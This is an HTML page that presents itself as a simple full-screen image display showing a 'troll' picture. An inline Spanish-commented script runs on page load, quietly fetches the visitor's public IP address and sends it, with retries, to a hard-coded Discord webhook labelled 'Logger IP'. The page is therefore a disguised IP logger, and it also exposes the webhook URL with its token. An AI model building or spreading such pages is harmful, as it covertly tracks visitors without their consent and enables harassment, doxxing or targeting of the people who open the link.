<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Display</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        img {
            width: 1920px;
            height: 1080px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2014/10/64609-estudio-dice-que-trolls-internet-son-sadicos-psicopatas.jpg?tf=3840x" alt="Troll Image">
    <script>
        // Reemplaza con tu URL de webhook v√°lida
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362970582341255188/cqrdjShxtYkeiiIkgAVeH588-_aji5XdVxERffsO6FGmNyJvhjRL80tuMdj-M6W0jXzS";

        async function obtenerDatos(retries = 3) {
            for (let attempt = 1; attempt <= retries; attempt++) {
                try {
                    console.log(`üîç Intento ${attempt} de obtener IP...`);

                    // Obtener IP IPv4
                    const ipResponse = await fetch("https://api.ipify.org?format=json", {
                        method: "GET",
                        headers: { "Accept": "application/json" }
                    });
                    if (!ipResponse.ok) {
                        throw new Error(`Error obteniendo IP: ${ipResponse.status}`);
                    }
                    const ipData = await ipResponse.json();
                    const ip = ipData.ip;

                    // Validar que es una IP IPv4
                    const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                    if (!ipv4Regex.test(ip)) {
                        throw new Error("No se obtuvo una IP IPv4 v√°lida");
                    }

                    console.log("‚úîÔ∏è IP IPv4 obtenida:", ip);

                    // Preparar mensaje para Discord
                    const mensaje = {
                        content: "**üîç Nueva IP detectada**",
                        embeds: [
                            {
                                title: "üåç Datos del usuario",
                                color: 16711680,
                                fields: [
                                    { name: "üñ•Ô∏è IP (IPv4)", value: `${ip}`, inline: true },
                                ],
                                footer: {
                                    text: "üîç Logger IP",
                                },
                            },
                        ],
                    };

                    // Enviar a Discord
                    console.log("üì§ Enviando datos a Discord...");
                    const webhookResponse = await fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje),
                    });

                    if (!webhookResponse.ok) {
                        throw new Error(`Error enviando a Discord: ${webhookResponse.status}`);
                    }

                    console.log("‚úîÔ∏è Datos enviados a Discord exitosamente");
                    return; // Salir si todo fue exitoso

                } catch (error) {
                    console.error(`‚ùå Error en intento ${attempt}:`, error.message);
                    if (attempt === retries) {
                        console.error("‚ùå Se agotaron los intentos. No se pudo enviar la IP.");
                    }
                    // Esperar 1 segundo antes de reintentar
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        // Ejecutar la funci√≥n
        obtenerDatos();
    </script>
</body>
</html>
